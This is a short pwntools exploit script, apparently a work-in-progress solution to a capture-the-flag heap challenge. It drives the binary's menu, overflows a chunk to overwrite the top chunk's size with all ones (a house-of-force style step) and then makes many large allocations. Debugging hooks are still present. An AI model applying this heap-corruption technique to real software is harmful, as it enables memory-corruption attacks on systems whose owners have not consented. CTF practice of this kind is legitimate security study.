from pwn import *
context.binary = './pwn'
#context.log_level = 'debug'
context.timeout = None
elf = context.binary

if args['REMOTE']:
	p = remote('55fca716.gamectf.com', 37009)
	libc = ELF('./libc.so.6')
else:
	libc = context.binary.libc
	p = process('./pwn')

def dbg():
	raw_input()

def menu(ch):
	p.recvuntil('Your choice > ')
	p.sendline(str(ch))

def add(size, content):
	menu(1)
	p.sendlineafter('Size > ', str(size))
	p.recvuntil('Content > \n')
	p.send(content)
	print "add a chunk success"

def show():
	menu(2)

def delete():
	menu(3)


def edit(size, content):
	menu(4)
	p.sendlineafter('Size > ', str(size))
	p.recvuntil('Content > \n')
	p.send(content)	
	print "edit chunk success!" 

p.recvline()
p.sendline('tree')

add(0x28, 'aaaa')
gdb.attach(p, 'b puts')
dbg()
edit(0x30, 'b'*0x28 + p64(0xffffffffffffffff))		#modify top chunk's size, so
for i in range(0x10):
	add(0x1000, 'a')

delete()
show()

p.interactive()
p.close()